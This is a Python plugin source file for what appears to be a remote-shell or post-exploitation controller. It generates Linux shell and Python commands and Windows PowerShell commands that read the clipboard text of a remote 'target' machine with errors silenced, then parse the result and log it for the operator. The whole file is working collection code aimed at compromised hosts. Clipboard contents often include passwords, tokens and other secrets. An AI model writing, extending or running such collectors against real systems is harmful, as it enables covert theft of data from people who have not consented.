"""Cross-platform remote clipboard read plugin."""

import json

from ...constants import PLUGIN_MARK_END, PLUGIN_MARK_START
from ..api import plugin, SessionContext
from ..linux._helpers import build_linux_collector_command
from .common import format_clipboard_report, resolve_session_platform
from .runner import _run_collector_marked, parse_collector_json


def _linux_collector_source():
    return r'''
import os, subprocess
result = {'ok': False, 'text': '', 'tool': '', 'reason': ''}
commands = [
    (['wl-paste', '--no-newline'], 'wl-paste'),
    (['wl-paste'], 'wl-paste'),
    (['xclip', '-o', '-selection', 'clipboard'], 'xclip'),
    (['xsel', '-p', '-b'], 'xsel'),
    (['xsel', '--clipboard', '--output'], 'xsel'),
]
for cmd, name in commands:
    try:
        out = subprocess.check_output(cmd, stderr=subprocess.DEVNULL, timeout=3)
        result['ok'] = True
        result['text'] = out.decode('utf-8', errors='replace')
        result['tool'] = name
        break
    except Exception:
        continue
if not result['ok']:
    if not os.environ.get('DISPLAY') and not os.environ.get('WAYLAND_DISPLAY'):
        result['reason'] = 'No graphical session detected (headless)'
    else:
        result['reason'] = 'No clipboard utility available (install wl-clipboard, xclip, or xsel)'
_emit(result)
'''


def _build_linux_command():
    mark_s = PLUGIN_MARK_START
    mark_e = PLUGIN_MARK_END
    py_cmd = build_linux_collector_command(_linux_collector_source())
    if py_cmd.endswith('; true'):
        py_cmd = py_cmd[:-6].rstrip()
    shell_cmd = (
        f"(T=''; "
        f"command -v wl-paste >/dev/null 2>&1 && T=$(wl-paste --no-newline 2>/dev/null); "
        f"[ -z \"$T\" ] && command -v wl-paste >/dev/null 2>&1 && T=$(wl-paste 2>/dev/null); "
        f"[ -z \"$T\" ] && command -v xclip >/dev/null 2>&1 && T=$(xclip -o -selection clipboard 2>/dev/null); "
        f"[ -z \"$T\" ] && command -v xsel >/dev/null 2>&1 && T=$(xsel -p -b 2>/dev/null); "
        f"[ -z \"$T\" ] && command -v xsel >/dev/null 2>&1 && T=$(xsel --clipboard --output 2>/dev/null); "
        f"printf '%s' '{mark_s}'; "
        f"if [ -n \"$T\" ]; then "
        f"printf '{{\"ok\":true,\"text\":\"%s\",\"tool\":\"shell\",\"reason\":\"\"}}' "
        f"\"$(printf '%s' \"$T\" | sed 's/\\\\/\\\\\\\\/g; s/\"/\\\\\"/g')\"; "
        f"else "
        f"printf '{{\"ok\":false,\"text\":\"\",\"tool\":\"\",\"reason\":\"No clipboard utility available (install wl-clipboard, xclip, or xsel)\"}}'; "
        f"fi; "
        f"printf '%s' '{mark_e}')"
    )
    return f"{py_cmd} || {shell_cmd}; true"


def _build_windows_command():
    return rf"""
$ErrorActionPreference='SilentlyContinue'
$start='{PLUGIN_MARK_START}'; $end='{PLUGIN_MARK_END}'
$result = @{{ ok = $false; text = ''; tool = 'powershell'; reason = '' }}
try {{
  Add-Type -AssemblyName System.Windows.Forms -ErrorAction Stop
  $text = [System.Windows.Forms.Clipboard]::GetText()
  if ($null -ne $text) {{
    $result.ok = $true
    $result.text = $text
  }} else {{
    $result.reason = 'Clipboard empty or non-text content'
  }}
}} catch {{
  try {{
    $text = Get-Clipboard -Format Text -ErrorAction Stop
    if ($text) {{ $result.ok = $true; $result.text = $text }} else {{ $result.reason = 'Clipboard empty' }}
  }} catch {{
    $result.reason = $_.Exception.Message
  }}
}}
Write-Output ($start+(ConvertTo-Json $result -Compress)+$end)
"""


@plugin.command(
    name='clipboard',
    platforms=['linux', 'windows', 'unix'],
    description='Read remote clipboard text',
)
def run(session: SessionContext, args):
    session.log_event('Plugin clipboard: collection started')
    session._handler._flush_shell(session._client_sock, timeout=1.0)

    platform = resolve_session_platform(session)
    win_ps = ''
    unix_cmd = 'true'
    if platform == 'windows':
        win_ps = _build_windows_command()
    elif platform in ('unix', 'linux'):
        unix_cmd = _build_linux_command()
        platform = 'unix'
    else:
        win_ps = _build_windows_command()
        unix_cmd = _build_linux_command()
        platform = 'unknown'

    raw = _run_collector_marked(session, unix_cmd, win_ps, platform, 20.0)

    if not raw or not raw.strip():
        session.print("Plugin 'clipboard' failed — no response from target.", 'red')
        session.log_plugin_result('clipboard', '', 'no response (timeout or missing markers)')
        return 1

    data = parse_collector_json(raw)
    if not data:
        session.print("Plugin 'clipboard' failed — could not parse results.", 'red')
        session.log_plugin_result('clipboard', raw[:4000], 'parse error')
        return 1

    if data.get('error'):
        session.print(f"Plugin 'clipboard' error on target: {data['error']}", 'red')
        detail = data.get('traceback', '')
        session.log_plugin_result('clipboard', raw[:4000], detail or str(data))
        return 1

    report = format_clipboard_report(data)
    session.print(report, 'green' if data.get('ok') else 'red')
    session.log_plugin_result('clipboard', report, json.dumps(data, indent=2))
    session.log_command('run clipboard', report)
    return 0 if data.get('ok') else 1
